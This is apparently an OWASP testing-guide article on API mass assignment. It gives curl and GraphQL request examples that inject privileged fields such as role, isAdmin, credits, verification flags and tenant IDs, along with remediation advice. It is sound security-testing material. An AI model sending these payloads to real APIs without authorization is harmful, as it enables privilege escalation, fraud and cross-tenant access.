# Testing API Mass Assignment

|ID          |
|------------|
|WSTG-APIT-07|

## Summary

Mass assignment (also called auto-binding) occurs when an API binds client-supplied data directly to internal objects without filtering which properties a caller may set. An attacker adds unexpected fields (such as `role`, `isAdmin`, or `balance`) to a request, and the server-side framework writes them to the data model.

For general mass assignment testing methodology, including framework-specific patterns (Spring, Laravel, ASP.NET), black-box detection techniques, and sensitive attribute wordlists, see [Mass Assignment (WSTG-INJT-20)](../07-Injection/20-Mass_Assignment.md).

This article covers mass assignment testing specific to API contexts: REST method behavior differences, JSON body manipulation, nested object injection, content-type switching, and GraphQL mutation mass assignment. It corresponds to OWASP API Security Top 10 [API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/).

## Test Objectives

- Identify API endpoints that accept structured input (JSON, XML, form-encoded) for object creation or modification.
- Determine which object properties can be set through client-supplied data by comparing API responses across methods.
- Confirm whether privileged or internal-only properties are accepted through REST-specific vectors (PUT vs PATCH, nested JSON, content-type switching).
- Test GraphQL mutations for field-level authorization bypass.

## How to Test

### Related Testing

The tests below build on the general mass assignment detection methodology in [WSTG-INJT-20](../07-Injection/20-Mass_Assignment.md), which covers:

- Identifying mass assignment handlers via bracket-syntax parameter probing.
- Sensitive field identification through HTML source, JavaScript, and API responses.
- Common attribute name wordlists (`is_admin`, `role`, `approved`, etc.).
- Framework-specific binding controls (Spring `setAllowedFields`, Laravel `$fillable`, ASP.NET `[Bind]`).

The tests in this article focus on API-specific attack vectors not addressed there.

### Identify Writable Properties by Comparing GET Responses with Write Endpoint Documentation

Retrieve an object through a GET request and note every field. Then compare with what the API documentation says the corresponding write endpoint accepts:

```bash
curl -s -H "Authorization: Bearer <TOKEN>" \
  https://api.example.com/v1/users/me | python3 -m json.tool
```

Example response:

```json
{
  "id": 42,
  "name": "Test User",
  "email": "test@example.com",
  "role": "user",
  "isAdmin": false,
  "verified": true,
  "credits": 0,
  "createdAt": "2025-01-15T10:00:00Z",
  "updatedAt": "2025-06-01T12:00:00Z"
}
```

Fields like `role`, `isAdmin`, `verified`, `credits`, `createdAt`, and `updatedAt` should not be writable by a regular user. Any field present in a GET response but absent from API documentation for the write endpoint is a candidate for mass assignment testing.

### Compare PUT and PATCH Behavior

REST APIs often treat PUT as full replacement and PATCH as partial update, with different validation logic on each path. This is an API-specific vector because traditional web forms use only POST.

First, establish a baseline by sending a valid PUT with all required fields but without extra properties:

```bash
# Baseline PUT: all required fields, no injection
curl -s -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"name":"Test","email":"test@example.com"}' \
  https://api.example.com/v1/users/me
```

Record the response status. Then add a privileged field to the same PUT body:

```bash
# PUT with injected field
curl -s -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"name":"Test","email":"test@example.com","role":"admin"}' \
  https://api.example.com/v1/users/me
```

Compare the two PUT responses. If the baseline succeeds but the injected version returns `400 Bad Request`, the API rejects the extra field on PUT. If both return the same status, the `400` may be caused by missing required fields rather than the injected property.

Then test the same field with PATCH:

```bash
# PATCH with injected field
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"role":"admin"}' \
  https://api.example.com/v1/users/me
```

A `200 OK` on PATCH when PUT rejects the same field indicates inconsistent input filtering between methods. Test each privileged field with both methods:

```bash
# Boolean privilege escalation via PATCH
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"isAdmin": true}' \
  https://api.example.com/v1/users/me

# Credit manipulation via PATCH
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"credits": 999999}' \
  https://api.example.com/v1/users/me

# Email verification bypass via PATCH
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"verified": true, "emailVerified": true}' \
  https://api.example.com/v1/users/me
```

Fetch the object after each test to verify whether the field changed:

```bash
curl -s -H "Authorization: Bearer <TOKEN>" \
  https://api.example.com/v1/users/me | python3 -m json.tool
```

### Test Mass Assignment During Object Creation

For testing mass assignment during object creation (registration, resource provisioning), including the `isAdmin` pattern, see [WSTG-INJT-20](../07-Injection/20-Mass_Assignment.md). When testing API endpoints, use JSON bodies and include fields discovered in the [identification step](#identify-writable-properties-by-comparing-get-responses-with-write-endpoint-documentation).

### Test Nested Object Property Injection

APIs that accept JSON bodies make nested object injection straightforward. While form-encoded bracket syntax (such as `user[profile][permissions]`) can also target nested properties (see [WSTG-INJT-20](../07-Injection/20-Mass_Assignment.md)), JSON bodies allow arbitrarily deep nesting without relying on framework-specific parameter binding conventions:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "profile": {
      "name": "Test",
      "permissions": {
        "canDelete": true,
        "canAdmin": true
      }
    }
  }' \
  https://api.example.com/v1/users/me
```

Also test with dot notation if the API supports flattened field paths:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "profile.permissions.canAdmin": true
  }' \
  https://api.example.com/v1/users/me
```

Test relationship injection through nested objects:

```bash
# Inject organization or tenant references
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "organization": {"id": "other-org-id"},
    "tenantId": "other-tenant"
  }' \
  https://api.example.com/v1/users/me
```

### Test Array Property Manipulation

If a user object has array properties (such as `groups` or `permissions`), test whether you can overwrite them:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "groups": ["users", "admins", "superadmins"]
  }' \
  https://api.example.com/v1/users/me
```

If the API backend uses a NoSQL database such as MongoDB, operators like `$push` passed in a JSON body may be interpreted as database commands. This is NoSQL operator injection, not mass assignment. See [NoSQL Injection](../07-Injection/05.6-NoSQL_Injection.md) for those tests.

### Test Content-Type Manipulation

Different content types may trigger different parsing and binding paths in the framework. If the API expects JSON, test with alternative content types using the same HTTP method established in earlier tests:

```bash
# JSON (expected)
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"name":"Test","role":"admin"}' \
  https://api.example.com/v1/users/me

# Form-encoded (unexpected - may bypass JSON-specific validation)
curl -s -X PATCH -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer <TOKEN>" \
  -d "name=Test&role=admin" \
  https://api.example.com/v1/users/me

# XML (if supported - may bypass JSON allowlist)
curl -s -X PATCH -H "Content-Type: application/xml" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '<user><name>Test</name><role>admin</role></user>' \
  https://api.example.com/v1/users/me
```

Some frameworks bind form-encoded data through a separate code path that may not apply the same property allowlist as the JSON parser.

### Test GraphQL Mutation Mass Assignment

GraphQL APIs may expose writable fields in mutations that are not visible in queries. This is API-specific because GraphQL input types are often auto-generated from the schema.

#### 1. Inspect Input Types via Introspection

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"UpdateUserInput\") { inputFields { name type { name kind ofType { name kind } } } } }"}' \
  https://api.example.com/graphql
```

Compare the `inputFields` of the mutation input type with the fields returned by the corresponding query. Fields present in the input type but not intended for user modification are mass assignment candidates.

#### 2. Inject Privileged Fields in Mutations

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "query": "mutation { updateUser(input: { name: \"Test\", role: \"admin\" }) { id name role } }"
  }' \
  https://api.example.com/graphql
```

#### 3. Test with Variables

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "query": "mutation UpdateUser($input: UpdateUserInput!) { updateUser(input: $input) { id role isAdmin } }",
    "variables": {
      "input": {
        "name": "Test",
        "role": "admin",
        "isAdmin": true,
        "verified": true
      }
    }
  }' \
  https://api.example.com/graphql
```

Insecure behavior: the mutation accepts and persists the injected fields.

## Related Test Cases

- [Mass Assignment (WSTG-INJT-20)](../07-Injection/20-Mass_Assignment.md)
- [NoSQL Injection](../07-Injection/05.6-NoSQL_Injection.md)

## Remediation

- Use an explicit allowlist of properties that each endpoint accepts. Deny anything not on the list.
- Separate the data transfer object (DTO) from the internal model so that client-supplied data never binds directly to privileged fields.
- Apply the same input filtering to all HTTP methods (PUT, PATCH, POST) and all content types the API accepts.
- For GraphQL, define strict input types that exclude sensitive fields rather than mirroring the output type.
- Validate nested object and array properties with the same rigor as top-level fields.
- Write integration tests that verify rejected properties remain unchanged after an update request.
- For general mass assignment prevention patterns, see [WSTG-INJT-20](../07-Injection/20-Mass_Assignment.md) and the [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

## References

- [Mass Assignment - WSTG-INJT-20](../07-Injection/20-Mass_Assignment.md)
- [OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
